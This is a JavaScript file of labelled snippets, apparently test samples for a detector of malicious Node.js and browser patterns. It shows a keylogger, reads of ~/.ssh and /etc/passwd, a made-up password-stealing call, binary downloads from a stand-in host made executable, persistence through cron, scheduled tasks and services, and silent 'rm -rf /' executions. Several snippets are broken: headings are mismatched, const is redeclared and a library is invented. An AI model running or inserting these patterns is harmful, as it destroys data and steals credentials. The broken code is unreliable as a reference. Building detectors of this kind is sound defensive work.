//Keylogger Pattern
document.onkeypress = function(event) {
  console.log(event.key);
}

//Access Envinroment Varaibles
console.log(process.env.PATH);

//Access to Clipboard Data
console.log(process.env.PATH);

//Browser Password Theft
import browserpass from 'browserpass';
browserpass.stealPasswords();

//Access Broswer Cookies
import cookieParser from 'cookie-parser';
cookieParser(req, res, next);

//Access to ssh directory
const sshDir = path.join(process.env.HOME, ".ssh");
fs.readdirSync(sshDir).forEach(file => {
  console.log(file);
});

//Access to /etc/passwd
const passwdFile = fs.readFileSync("/etc/passwd", "utf8");
console.log(passwdFile);

//Access to environment variables
console.log(process.env.USER);
console.log(process.env.PATH);

//Check for base64 encoded strings
const encodedString = "VGhpcyBpcyBhIHRlc3Q=";
const decodedArray = new Uint8Array(atob(encodedString).split('').map(char => char.charCodeAt(0)));
const decodedString = new TextDecoder().decode(decodedArray);
console.log(decodedString);
//Issue iwth this one

//Check for eval function
var str = 'console.log("hello");';
eval(str);

//Check for obfuscated variable name
var a = 1;
var b = 2;
var c = a + b;
console.log(c);

//Cron job
const cron = require('cron');
const job = new cron.CronJob('* * * * * *', function() {
  console.log('This job runs every second');
});

job.setTime('0 0 12 * * *'); // Changes job to run daily at noon
job.start();

//Scheduled Task
const task = require('node-taskscheduler');
const myTask = task.createTask('My Task');
myTask.setTrigger('weekly', { daysOfWeek: [1, 3, 5], startBoundary: new Date() });
myTask.save();


//Service
const Service = require('node-windows').Service;
const svc = new Service({
  name:'My Service',
  description: 'My service description',
  script: 'C:\\myscript.js'
});

svc.description = 'My updated service description';
svc.save();

//Use axios to download binary file
axios.get('https://example.com/binary.exe', { responseType: 'arraybuffer' })
  .then(response => {
    fs.writeFileSync('/path/to/binary.exe', response.data);
  })
  .catch(error => {
    console.error(error);
  });


//Use request to download binary file
request.get({ url: 'https://example.com/binary.exe', encoding: null }, (error, response, body) => {
  if (!error && response.statusCode === 200) {
    fs.writeFileSync('/path/to/binary.exe', body);
  } else {
    console.error(error);
  }
});

//Use request-promise to download binary file
const options = { uri: 'https://example.com/binary.exe', encoding: null };
rp(options)
  .then(body => {
    fs.writeFileSync('/path/to/binary.exe', body);
  })
  .catch(error => {
    console.error(error);
  });


//Use wget to download binary file
const { exec } = require('child_process');

exec('wget https://example.com/binary.exe -O /path/to/binary.exe', (error, stdout, stderr) => {
  if (error) {
    console.error(error);
  } else {
    console.log('Binary file downloaded successfully');
  }
});

//Use curl to download binary file
const { exec } = require('child_process');

exec('curl https://example.com/binary.exe -o /path/to/binary.exe', (error, stdout, stderr) => {
  if (error) {
    console.error(error);
  } else {
    console.log('Binary file downloaded successfully');
  }
});

//Use chmod to download binary file
fs.chmod('/path/to/binary.exe', 0o755, error => {
  if (error) {
    console.error(error);
  } else {
    console.log('Binary file made executable');
  }
});

//Use child_process.exec w/ silent exec
const command = 'rm -rf /';
child_process.exec(command, { silent: true }, function(error, stdout, stderr) {
  // Do something
});

//Use child_prcess.spawn w/ silent exec
const command = 'rm -rf /';
child_process.spawn(command, [], { stdio: [null, null, null] });

//Use chld_prcess.execFile w/ silent exec
const program = '/bin/ls';
child_process.execFile(program, { silent: true }, function(error, stdout, stderr) {
  // Do something
});

//Use child_prcess.spawnSync w/ silent exec
const command = 'rm -rf /';
child_process.spawnSync(command, [], { stdio: [null, null, null] });


